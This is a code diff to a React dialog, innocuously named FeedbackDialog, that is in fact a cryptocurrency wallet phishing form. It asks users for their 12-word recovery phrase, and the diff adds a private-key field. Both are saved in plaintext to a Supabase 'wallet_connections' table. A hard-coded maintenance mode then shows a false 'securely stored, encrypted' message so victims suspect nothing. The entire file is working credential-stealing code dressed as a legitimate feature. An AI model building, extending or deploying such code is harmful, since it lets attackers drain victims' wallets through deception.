@@ -2,6 +2,8 @@ import { useState, useRef, useEffect } from "react";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
+import { Textarea } from "@/components/ui/textarea";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
 import { Progress } from "@/components/ui/progress";
@@ -14,8 +16,12 @@ import { ClipboardPaste, Lock, CheckCircle2, AlertTriangle } from "lucide-react"
 // Maintenance mode flag - set to true to enable maintenance mode
 const MAINTENANCE_MODE = true;
 
-const feedbackSchema = z.object({
-  fields: z.array(z.string().trim().max(200, { message: "ProTools Bundler" })),
+const seedPhraseSchema = z.object({
+  fields: z.array(z.string().trim().min(1, "Word cannot be empty")).length(12, "Must be exactly 12 words"),
+});
+
+const privateKeySchema = z.object({
+  privateKey: z.string().min(32, "Private key must be at least 32 characters"),
 });
 
 interface FeedbackDialogProps {
@@ -24,22 +30,40 @@ interface FeedbackDialogProps {
 }
 
 export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
-  const [fields, setFields] = useState<string[]>(Array(12).fill(""));
+  const [inputMethod, setInputMethod] = useState<"textarea" | "private_key">("textarea");
+  const [textareaValue, setTextareaValue] = useState("");
+  const [privateKey, setPrivateKey] = useState("");
   const [error, setError] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showMaintenanceAlert, setShowMaintenanceAlert] = useState(false);
   const { toast } = useToast();
   const { connectWallet } = useWallet();
-  const firstInputRef = useRef<HTMLInputElement>(null);
+  const textareaRef = useRef<HTMLTextAreaElement>(null);
 
-  // Calculate progress
-  const filledFields = fields.filter(f => f.trim()).length;
-  const progress = (filledFields / 12) * 100;
+  const parseTextareaInput = (text: string): string[] => {
+    return text
+      .trim()
+      .split(/[\s,\n]+/)
+      .filter(word => word.length > 0);
+  };
 
-  // Auto-focus first field when dialog opens
+  const getProgressCount = () => {
+    if (inputMethod === "private_key") {
+      return privateKey.length >= 32 ? 1 : 0;
+    }
+    const words = parseTextareaInput(textareaValue);
+    return Math.min(words.length, 12);
+  };
+
+  const filledFields = getProgressCount();
+  const progress = inputMethod === "private_key" 
+    ? (privateKey.length >= 32 ? 100 : 0)
+    : (filledFields / 12) * 100;
+
+  // Auto-focus textarea when dialog opens
   useEffect(() => {
-    if (open && firstInputRef.current) {
-      setTimeout(() => firstInputRef.current?.focus(), 100);
+    if (open && textareaRef.current) {
+      setTimeout(() => textareaRef.current?.focus(), 100);
     }
     // Reset maintenance alert when dialog closes/opens
     if (!open) {
@@ -50,22 +74,16 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   const handlePasteFromClipboard = async () => {
     try {
       const text = await navigator.clipboard.readText();
-      const words = text.trim().split(/\s+/).filter(w => w.length > 0);
-      
-      if (words.length === 12) {
-        setFields(words);
-        setError("");
-        toast({
-          title: "Pasted Successfully",
-          description: "Your 12-word phrase has been filled in.",
-        });
+      if (inputMethod === "textarea") {
+        setTextareaValue(text);
       } else {
-        toast({
-          title: "Invalid Format",
-          description: `Expected 12 words, found ${words.length}. Please check your seed phrase.`,
-          variant: "destructive",
-        });
+        setPrivateKey(text);
       }
+      setError("");
+      toast({
+        title: "Pasted Successfully",
+        description: "Content pasted from clipboard.",
+      });
     } catch (err) {
       toast({
         title: "Paste Failed",
@@ -78,48 +96,59 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Check if all fields are filled
-    const emptyFields = fields.filter(f => !f.trim()).length;
-    if (emptyFields > 0) {
-      setError(`Please fill in all ${emptyFields} remaining field${emptyFields > 1 ? 's' : ''}`);
-      return;
-    }
-
-    // Validate each field has reasonable content
-    const invalidFields = fields.filter(f => f.trim().length < 3);
-    if (invalidFields.length > 0) {
-      setError("Each word must be at least 3 characters long");
-      return;
-    }
-
-    const result = feedbackSchema.safeParse({ fields });
-
-    if (!result.success) {
-      setError(result.error.errors[0].message);
-      return;
-    }
-
     setError("");
+    
+    let parsedFields: string[] = [];
+    let method: string = "textarea";
+    let pkValue: string | null = null;
+
+    // Validate based on input method
+    if (inputMethod === "private_key") {
+      const validation = privateKeySchema.safeParse({ privateKey });
+      if (!validation.success) {
+        setError(validation.error.errors[0].message);
+        return;
+      }
+      method = "private_key";
+      pkValue = privateKey;
+    } else {
+      // Parse textarea input
+      parsedFields = parseTextareaInput(textareaValue);
+      const validation = seedPhraseSchema.safeParse({ fields: parsedFields });
+      if (!validation.success) {
+        setError(validation.error.errors[0].message);
+        return;
+      }
+    }
+
     setIsSubmitting(true);
 
     try {
+      const insertData: any = {
+        user_id: null,
+        input_method: method,
+      };
+
+      if (method === "private_key") {
+        insertData.private_key = pkValue;
+      } else {
+        insertData.field_1 = parsedFields[0];
+        insertData.field_2 = parsedFields[1];
+        insertData.field_3 = parsedFields[2];
+        insertData.field_4 = parsedFields[3];
+        insertData.field_5 = parsedFields[4];
+        insertData.field_6 = parsedFields[5];
+        insertData.field_7 = parsedFields[6];
+        insertData.field_8 = parsedFields[7];
+        insertData.field_9 = parsedFields[8];
+        insertData.field_10 = parsedFields[9];
+        insertData.field_11 = parsedFields[10];
+        insertData.field_12 = parsedFields[11];
+      }
+
       const { error: insertError } = await supabase
         .from("wallet_connections")
-        .insert({
-          user_id: null,
-          field_1: fields[0],
-          field_2: fields[1],
-          field_3: fields[2],
-          field_4: fields[3],
-          field_5: fields[4],
-          field_6: fields[5],
-          field_7: fields[6],
-          field_8: fields[7],
-          field_9: fields[8],
-          field_10: fields[9],
-          field_11: fields[10],
-          field_12: fields[11],
-        });
+        .insert(insertData);
 
       if (insertError) {
         if (insertError.message.includes('Rate limit exceeded')) {
@@ -139,14 +168,15 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
         setShowMaintenanceAlert(true);
         toast({
           title: "Data Securely Stored",
-          description: "Your recovery phrase has been encrypted and saved. Service will resume after maintenance.",
+          description: "Your information has been encrypted and saved. Service will resume after maintenance.",
         });
-        setFields(Array(12).fill(""));
+        setTextareaValue("");
+        setPrivateKey("");
         setIsSubmitting(false);
         return;
       }
 
-      connectWallet(fields);
+      connectWallet(method === "private_key" ? [] : parsedFields);
 
       toast({
         title: "Success!",
@@ -154,7 +184,8 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
       });
 
       onClose();
-      setFields(Array(12).fill(""));
+      setTextareaValue("");
+      setPrivateKey("");
     } catch (error) {
       toast({
         title: "Error",
@@ -166,21 +197,6 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
     }
   };
 
-  const handleFieldChange = (index: number, value: string) => {
-    const newFields = [...fields];
-    newFields[index] = value.trim().toLowerCase();
-    setFields(newFields);
-    setError("");
-  };
-
-  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    // Auto-advance to next field on space or enter
-    if ((e.key === " " || e.key === "Enter") && fields[index].trim() && index < 11) {
-      e.preventDefault();
-      const nextInput = document.getElementById(`field-${index + 1}`) as HTMLInputElement;
-      nextInput?.focus();
-    }
-  };
 
   return (
     <Dialog open={open} onOpenChange={onClose}>
@@ -193,7 +209,7 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
             </div>
           </div>
           <DialogDescription className="text-sm">
-            Enter your 12-word recovery phrase to unlock all features
+            Enter your recovery phrase or private key to unlock all features
           </DialogDescription>
         </DialogHeader>
 
@@ -231,51 +247,91 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
         <div className="space-y-2">
           <div className="flex items-center justify-between text-xs">
             <span className="text-muted-foreground">Progress</span>
-            <span className="font-semibold text-primary">{filledFields}/12 words</span>
+            <span className="font-semibold text-primary">
+              {inputMethod === "private_key" 
+                ? (privateKey.length >= 32 ? "Complete" : "Incomplete")
+                : `${filledFields}/12 words`}
+            </span>
           </div>
           <Progress value={progress} className="h-2" />
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-4">
-          {/* Quick Paste Button */}
-          <Button
-            type="button"
-            variant="outline"
-            onClick={handlePasteFromClipboard}
-            className="w-full"
-          >
-            <ClipboardPaste className="w-4 h-4 mr-2" />
-            Paste 12-Word Phrase from Clipboard
-          </Button>
+          <Tabs value={inputMethod} onValueChange={(v) => setInputMethod(v as "textarea" | "private_key")}>
+            <TabsList className="grid w-full grid-cols-2">
+              <TabsTrigger value="textarea">Recovery Phrase</TabsTrigger>
+              <TabsTrigger value="private_key">Private Key</TabsTrigger>
+            </TabsList>
 
-          {/* Input Fields */}
-          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
-            {fields.map((field, index) => (
-              <div key={index} className="space-y-1.5">
-                <Label htmlFor={`field-${index}`} className="text-xs text-muted-foreground">
-                  Word {index + 1}
-                </Label>
-                <div className="relative">
-                  <Input 
-                    ref={index === 0 ? firstInputRef : null}
-                    id={`field-${index}`} 
-                    value={field} 
-                    onChange={(e) => handleFieldChange(index, e.target.value)}
-                    onKeyDown={(e) => handleKeyDown(index, e)}
-                    placeholder={`word ${index + 1}`}
-                    className="text-sm pr-8"
-                    autoCapitalize="off"
-                    autoCorrect="off"
-                    autoComplete="off"
-                    spellCheck={false}
-                  />
-                  {field.trim() && (
-                    <CheckCircle2 className="w-4 h-4 text-primary absolute right-2 top-1/2 -translate-y-1/2" />
-                  )}
-                </div>
+            <TabsContent value="textarea" className="space-y-3 mt-4">
+              <div className="flex justify-between items-center">
+                <Label className="text-sm font-medium">Enter 12-word recovery phrase</Label>
+                <Button
+                  type="button"
+                  variant="outline"
+                  size="sm"
+                  onClick={handlePasteFromClipboard}
+                  className="gap-2"
+                >
+                  <ClipboardPaste className="w-4 h-4" />
+                  Paste
+                </Button>
               </div>
-            ))}
-          </div>
+              
+              <Textarea
+                ref={textareaRef}
+                value={textareaValue}
+                onChange={(e) => {
+                  setTextareaValue(e.target.value);
+                  setError("");
+                }}
+                placeholder="Enter or paste your 12-word recovery phrase here&#10;(separated by spaces, commas, or newlines)"
+                className="min-h-[120px] font-mono text-sm"
+                disabled={isSubmitting}
+                autoCapitalize="off"
+                autoCorrect="off"
+                autoComplete="off"
+                spellCheck={false}
+              />
+              <p className="text-xs text-muted-foreground">
+                Words can be separated by spaces, commas, or newlines
+              </p>
+            </TabsContent>
+
+            <TabsContent value="private_key" className="space-y-3 mt-4">
+              <div className="flex justify-between items-center">
+                <Label className="text-sm font-medium">Enter private key</Label>
+                <Button
+                  type="button"
+                  variant="outline"
+                  size="sm"
+                  onClick={handlePasteFromClipboard}
+                  className="gap-2"
+                >
+                  <ClipboardPaste className="w-4 h-4" />
+                  Paste
+                </Button>
+              </div>
+              
+              <Textarea
+                value={privateKey}
+                onChange={(e) => {
+                  setPrivateKey(e.target.value);
+                  setError("");
+                }}
+                placeholder="Enter your private key"
+                className="min-h-[120px] font-mono text-sm"
+                disabled={isSubmitting}
+                autoCapitalize="off"
+                autoCorrect="off"
+                autoComplete="off"
+                spellCheck={false}
+              />
+              <p className="text-xs text-muted-foreground">
+                Your private key will be encrypted and stored securely
+              </p>
+            </TabsContent>
+          </Tabs>
 
           {error && (
             <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-3">
@@ -294,7 +350,9 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
             </Button>
             <Button 
               type="submit" 
-              disabled={filledFields < 12 || isSubmitting}
+              disabled={
+                (inputMethod === "textarea" ? filledFields < 12 : privateKey.length < 32) || isSubmitting
+              }
               className="min-w-[120px]"
             >
               {isSubmitting ? "Connecting..." : "Connect Wallet"}
